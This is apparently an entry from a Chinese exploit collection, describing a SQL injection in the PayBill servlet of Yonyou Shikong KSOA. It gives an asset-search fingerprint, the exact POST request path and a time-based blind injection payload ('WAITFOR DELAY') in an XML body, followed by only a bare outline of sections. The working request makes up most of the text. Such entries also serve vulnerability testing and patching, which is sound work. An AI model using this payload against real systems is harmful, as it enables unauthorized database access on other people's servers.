# 用友时空KSOAPayBill参数存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友时空 KSOA"`
- **请求**：`POST /servlet/PayBill?caculate&_rnd= HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 142`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';--+</name><name>1</name><name>102360</name></root>
```

**其他**
- 用友时空KSOA PayBill参数存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友时空KSOA